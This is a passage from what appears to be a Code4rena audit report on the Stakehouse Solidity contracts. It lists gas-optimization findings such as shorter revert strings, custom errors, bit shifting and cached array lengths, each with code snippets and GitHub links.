class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑09] <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</h2>\n<p>Each extra memory word of bytes past the original 32 <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings\">incurs an MSTORE</a> which costs <strong>3 gas</strong>.</p>\n<p><em>There are 39 instances of this issue.</em></p>\n<h2 id=\"g10-optimize-names-to-save-gas\" style=\"position:relative;\"><a href=\"#g10-optimize-names-to-save-gas\" aria-label=\"g10 optimize names to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑10] Optimize names to save gas</h2>\n<p><code>public</code>/<code>external</code> function names and <code>public</code> member variable names can be optimized to save gas. See <a href=\"https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9\">this</a> link for an example of how it works. In this report are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save <strong>128 gas</strong> each during deployment, and renaming functions to have lower method IDs will save <strong>22 gas</strong> per call, <a href=\"https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\">per sorted position shifted</a>.</p>\n<p><em>There are 16 instances of this issue.</em></p>\n<h2 id=\"g11-internal-functions-not-called-by-the-contract-should-be-removed-to-save-deployment-gas\" style=\"position:relative;\"><a href=\"#g11-internal-functions-not-called-by-the-contract-should-be-removed-to-save-deployment-gas\" aria-label=\"g11 internal functions not called by the contract should be removed to save deployment gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑11] <code>internal</code> functions not called by the contract should be removed to save deployment gas</h2>\n<p>If the functions are required by an interface, the contract should inherit from that interface and use the <code>override</code> keyword.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"178\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Syndicate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">538</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_calculateCollateralizedETHOwedPerKnot</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">545</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_calculateNewAccumulatedETHPerCollateralizedShare</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ethSinceLastUpdate</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L538\">https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L538</a></p>\n<h2 id=\"g12-dont-compare-boolean-expressions-to-boolean-literals\" style=\"position:relative;\"><a href=\"#g12-dont-compare-boolean-expressions-to-boolean-literals\" aria-label=\"g12 dont compare boolean expressions to boolean literals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑12] Don’t compare boolean expressions to boolean literals</h2>\n<p><code>if (&#x3C;x> == true)</code> => <code>if (&#x3C;x>)</code>, <code>if (&#x3C;x> == false)</code> => <code>if (!&#x3C;x>)</code></p>\n<p><em>There are 19 instances of this issue.</em></p>\n<h2 id=\"g13-ternary-unnecessary\" style=\"position:relative;\"><a href=\"#g13-ternary-unnecessary\" aria-label=\"g13 ternary unnecessary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑13] Ternary unnecessary</h2>\n<p><code>z = (x == y) ? true : false</code> => <code>z = (x == y)</code></p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"179\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OwnableSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> ? </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">_isTransferApproved</span><span class=\"mtk1\">[</span><span class=\"mtk12\">from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">to</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// F: [OSW-2, 3]</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/smart-wallet/OwnableSmartWallet.sol#L145\">https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/smart-wallet/OwnableSmartWallet.sol#L145</a></p>\n<h2 id=\"g14-division-by-two-should-use-bit-shifting\" style=\"position:relative;\"><a href=\"#g14-division-by-two-should-use-bit-shifting\" aria-label=\"g14 division by two should use bit shifting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑14] Division by two should use bit shifting</h2>\n<p><code>&#x3C;x> / 2</code> is the same as <code>&#x3C;x> >> 1</code>. While the compiler uses the <code>SHR</code> opcode to accomplish both, the version that uses division incurs an overhead of <a href=\"https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff\"><strong>20 gas</strong></a> due to <code>JUMP</code>s to and from a compiler utility function that introduces checks which can be avoided by using <code>unchecked {}</code> around the division by two.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"180\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Syndicate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">378</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethPerKnot</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L378\">https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L378</a></p>\n<h2 id=\"g15-stack-variable-used-as-a-cheaper-cache-for-a-state-variable-is-only-used-once\" style=\"position:relative;\"><a href=\"#g15-stack-variable-used-as-a-cheaper-cache-for-a-state-variable-is-only-used-once\" aria-label=\"g15 stack variable used as a cheaper cache for a state variable is only used once permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑15] Stack variable used as a cheaper cache for a state variable is only used once</h2>\n<p>If the variable is only accessed once, it’s cheaper to use the state variable directly that one time, and save the <strong>3 gas</strong> the extra stack assignment would spend.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"181\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Syndicate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">388</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentAccumulatedETHPerFreeFloatingShare</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accumulatedETHPerFreeFloatingShare</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L388\">https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L388</a></p>\n<h2 id=\"g16-empty-blocks-should-be-removed-or-emit-something\" style=\"position:relative;\"><a href=\"#g16-empty-blocks-should-be-removed-or-emit-something\" aria-label=\"g16 empty blocks should be removed or emit something permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑16] Empty blocks should be removed or emit something</h2>\n<p>The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be <code>abstract</code> and the function signatures be added without any default implementation. If the block is an empty <code>if</code>-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (<code>if(x){}else if(y){...}else{...}</code> => <code>if(!x){if(y){...}else{...}}</code>). Empty <code>receive()</code>/<code>fallback() payable</code> functions that are not used, can be removed to save deployment gas.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"182\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Syndicate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">           } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">195</span><span class=\"mtk1\">               </span><span class=\"mtk3\">// todo - check else case for any ETH lost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:          }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L194-L196\">https://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/syndicate/Syndicate.sol#L194-L196</a></p>\n<h2 id=\"g17-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g17-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g17 use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑17] Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas.</p>\n<p><em>There are 21 instances of this issue.</em></p>\n<h2 id=\"g18-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g18-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g18 functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑18] Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p>If a function modifier such as <code>onlyOwner</code> is used, the function will revert if a normal user tries to pay the function. Marking the function as <code>payable</code> will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n<code>CALLVALUE</code>(2),<code>DUP1</code>(3),<code>ISZERO</code>(3),<code>PUSH2</code>(3),<code>JUMPI</code>(10),<code>PUSH1</code>(3),<code>DUP1</code>(3),<code>REVERT</code>(0),<code>JUMPDEST</code>(1),<code>POP</code>(2), which costs an average of about <strong>21 gas per call</strong> to the function, in addition to the extra deployment cost.</p>\n<p><em>There are 20 instances of this issue.</em></p>\n<h2 id=\"excluded-gas-findings\" style=\"position:relative;\"><a href=\"#excluded-gas-findings\" aria-label=\"excluded gas findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Excluded Gas Findings</h2>\n<p>These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑19]</td>\n<td align=\"left\"><code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</td>\n<td align=\"center\">16</td>\n<td align=\"center\">48</td>\n</tr>\n<tr>\n<td>[G‑20]</td>\n<td align=\"left\">Using <code>bool</code>s for storage incurs overhead</td>\n<td align=\"center\">9</td>\n<td align=\"center\">153900</td>\n</tr>\n<tr>\n<td>[G‑21]</td>\n<td align=\"left\"><code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</td>\n<td align=\"center\">1</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>[G‑22]</td>\n<td align=\"left\">Using <code>private</code> rather than <code>public</code> for constants, saves gas</td>\n<td align=\"center\">4</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑23]</td>\n<td align=\"left\">Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</td>\n<td align=\"center\">198</td>\n<td align=\"center\">-</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 228 instances over 5 issues with <strong>153953 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions.</p>\n<h3 id=\"g19-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" style=\"position:relative;\"><a href=\"#g19-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" aria-label=\"g19 arraylength should not be looked up in every loop of a for loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑19] <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</h3>\n<p>The overheads outlined in this report are <em>PER LOOP</em>, excluding the first loop</p>\n<ul>\n<li>storage arrays incur a Gwarmaccess (<strong>100 gas</strong>)</li>\n<li>memory arrays use <code>MLOAD</code> (<strong>3 gas</strong>)</li>\n<li>calldata arrays use <code>CALLDATALOAD</code> (<strong>3 gas</strong>)</li>\n</ul>\n<p>Caching the length changes each of these to a <code>DUP&#x3C;N></code> (<strong>3 gas</strong>), and gets rid of the extra <code>DUP&#x3C;N></code> needed to store the stack offset</p>\n<p><em>There are 16 instances of this issue.</em></p>\n<h3 id=\"g20-using-bools-for-storage-incurs-overhead\" style=\"position:relative;\"><a href=\"#g20-using-bools-for-storage-incurs-overhead\" aria-label=\"g20 using bools for storage incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑20] Using <code>bool</code>s for storage incurs overhead</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"183\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Booleans are more expensive than uint256 or any type that takes up a full</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// word because each write operation emits an extra SLOAD to first read the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// slot&#39;s contents, replace the bits taken up by the boolean, and then write</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// back. This is the compiler&#39;s defense against contract upgrades and</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// pointer aliasing, and it cannot be disabled.</span></span></span></code></pre>\n<p><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27</a><br>\nUse <code>uint256(1)</code> and <code>uint256(2)</code> for true/false to avoid a Gwarmaccess (<strong><a href=\"https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058\">100 gas</a></strong>) for the extra SLOAD, and to avoid Gsset (<strong>20000 gas</strong>) when changing from <code>false</code> to <code>true</code>, after having been <code>true</code> in the past.</p>\n<p><em>There are 9 instances of this issue.</em></p>\n<h3 id=\"g21-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" style=\"position:relative;\"><a href=\"#g21-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" aria-label=\"g21 i costs less gas than i especially when its used in for loops   ii   too permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑21] <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</h3>\n<p>Saves <strong>5 gas per loop</strong></p>\n<p><em>There is 1 instance of this 